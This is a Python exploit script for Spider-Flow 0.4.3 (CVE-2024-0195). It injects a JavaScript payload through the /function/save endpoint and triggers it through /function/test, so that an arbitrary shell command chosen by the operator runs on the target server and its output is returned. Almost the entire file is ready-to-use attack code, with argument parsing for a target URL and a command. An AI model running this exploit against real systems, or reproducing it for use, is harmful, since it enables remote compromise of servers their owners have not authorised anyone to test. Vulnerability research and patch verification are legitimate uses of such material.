#!/usr/bin/env python3
"""
Spider-Flow 0.4.3 Remote Code Execution Exploit (CVE-2024-0195)
This exploit demonstrates the code injection vulnerability in the FunctionService.saveFunction method.
"""

import requests
import json
import sys
import argparse
import urllib.parse
import time

class SpiderFlowExploit:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.function_save_url = f"{self.target_url}/function/save"
        self.function_name = f"test_function_{int(time.time())}"

    def create_payload(self, cmd):
        # Encode command to prevent issues with special characters
        encoded_cmd = urllib.parse.quote(cmd)

        js_payload = f"""
        var Base64 = Java.type('java.util.Base64');
        var System = Java.type('java.lang.System');
        var ProcessBuilder = Java.type('java.lang.ProcessBuilder');
        var Arrays = Java.type('java.util.Arrays');

        function executeCommand(cmd) {{
            try {{
                print('Executing command: ' + cmd);
                var pb = new ProcessBuilder(cmd.split(' '));
                pb.redirectErrorStream(true);
                var process = pb.start();

                var reader = new java.io.BufferedReader(
                    new java.io.InputStreamReader(process.getInputStream())
                );
                var output = new java.lang.StringBuilder();
                var line;

                while ((line = reader.readLine()) !== null) {{
                    output.append(line + '\\n');
                    print('Output line: ' + line);
                }}

                var exitCode = process.waitFor();
                print('Exit code: ' + exitCode);

                var result = output.toString();
                print('Final output: ' + result);
                return Base64.getEncoder().encodeToString(result.getBytes('UTF-8'));
            }} catch(e) {{
                print('Error: ' + e);
                return Base64.getEncoder().encodeToString(('Error: ' + e.toString()).getBytes('UTF-8'));
            }}
        }}

        executeCommand('{encoded_cmd}');
        """
        return js_payload

    def exploit(self, cmd):
        try:
            # Prepare the payload
            data = {
                'name': self.function_name,
                'parameter': '',
                'script': self.create_payload(cmd)
            }

            # Send the exploit
            print("[*] Sending exploit to " + self.function_save_url)
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Accept': 'application/json, text/plain, */*'
            }

            # First save the function
            response = requests.post(
                self.function_save_url,
                data=data,
                headers=headers,
                verify=False
            )

            print("[*] Response status:", response.status_code)
            print("[*] Response headers:", response.headers)
            print("[*] Raw response:", response.text)

            # Get the function ID from the list endpoint
            list_url = f"{self.target_url}/function/list"
            print("[*] Getting function list from:", list_url)
            list_response = requests.get(
                list_url,
                headers=headers,
                verify=False
            )

            function_id = None
            if list_response.status_code == 200:
                try:
                    functions = list_response.json()['records']
                    for func in functions:
                        if func['name'] == self.function_name:
                            function_id = func['id']
                            break
                except Exception as e:
                    print(f"[-] Error parsing function list: {str(e)}")

            if not function_id:
                print("[-] Failed to get function ID")
                return

            # Execute the function
            execute_url = f"{self.target_url}/function/test"
            execute_data = {
                'name': self.function_name,
                'parameter': ''
            }

            print("[*] Executing function at:", execute_url)
            print("[*] Using function name:", execute_data['name'])
            execute_response = requests.post(
                execute_url,
                data=execute_data,
                headers=headers,
                verify=False
            )

            print("[*] Execute response status:", execute_response.status_code)
            print("[*] Execute response:", execute_response.text)

            # Try to decode base64 response
            if execute_response.status_code == 200:
                try:
                    if execute_response.text and not "error" in execute_response.text.lower():
                        import base64
                        output = base64.b64decode(execute_response.text.strip('"')).decode('utf-8')
                        print("\n=== Command Output ===")
                        print(output)
                    else:
                        print("[-] Error in response:")
                        print(execute_response.text)
                except Exception as e:
                    print("[-] Failed to decode response:", str(e))
                    print(execute_response.text)
            else:
                print(f"[-] Failed to execute function. Status code: {execute_response.status_code}")
                print(execute_response.text)

        except Exception as e:
            print(f"[-] Error during exploitation: {str(e)}")
            raise

def main():
    parser = argparse.ArgumentParser(description='Spider-Flow 0.4.3 RCE Exploit (CVE-2024-0195)')
    parser.add_argument('-u', '--url', required=True, help='Target URL (e.g., http://localhost:8088)')
    parser.add_argument('-c', '--command', required=True, help='Command to execute')
    args = parser.parse_args()

    exploit = SpiderFlowExploit(args.url)
    exploit.exploit(args.command)

if __name__ == "__main__":
    main()
